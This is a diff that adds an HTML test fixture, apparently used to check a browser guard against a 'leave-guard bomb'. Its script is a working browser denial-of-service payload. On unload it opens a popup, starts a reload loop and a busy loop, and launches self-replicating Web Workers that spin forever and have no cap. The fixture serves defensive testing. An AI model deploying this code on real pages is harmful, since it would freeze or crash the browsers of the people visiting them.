@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>bomb fixture: full-force</title>
+</head>
+<body>
+<h1>full-force</h1>
+<script>
+// Full-force reproduction of the decoded leave-guard bomb: 20 blob seeds on
+// both beforeunload and unload, popup, reload loop, main-thread rAF busy loop,
+// and unbounded self-replicating worker payloads that spin forever. There is
+// intentionally no generation cap and no self-watchdog: if the guard fails this
+// is meant to run away exactly like the real thing.
+(function () {
+  var SEEDS = 20;
+  var origin = location.origin;
+  var handlerTick = origin + '/tick?name=unload-handler';
+  var spawned = 0;
+
+  var template = [
+    "(async function () {",
+    "  try { await fetch(" + JSON.stringify(origin) + " + '/tick?name=payload'); } catch (e) {}",
+    "  try {",
+    "    var res = await fetch(self.location.href);",
+    "    var code = await res.text();",
+    "    var children = 1 + Math.floor(Math.random() * 3);",
+    "    for (var i = 0; i < children; i++) {",
+    "      var u = URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));",
+    "      new Worker(u);",
+    "    }",
+    "  } catch (e) {}",
+    "  while (true) { Math.random(); }",
+    "})();"
+  ].join("\n");
+
+  function busyLoop() {
+    for (var i = 0; i < 1000000; i++) {}
+    if (spawned > 0) {
+      requestAnimationFrame(busyLoop);
+    }
+  }
+
+  function detonate() {
+    try { fetch(handlerTick); } catch (e) {}
+    try { window.open(location.href, '_blank'); } catch (e) {}
+    try { setTimeout(function () { location.href = location.href; }, 2000); } catch (e) {}
+    var url = URL.createObjectURL(new Blob([template], { type: 'application/javascript' }));
+    for (var i = 0; i < SEEDS; i++) {
+      spawned++;
+      new Worker(url);
+    }
+    requestAnimationFrame(busyLoop);
+  }
+
+  window.addEventListener('beforeunload', function (event) {
+    try { event.returnValue = 'Are you sure you want to leave?'; } catch (e) {}
+    detonate();
+  });
+  window.addEventListener('unload', function () {
+    detonate();
+  });
+})();
+</script>
+</body>
+</html>
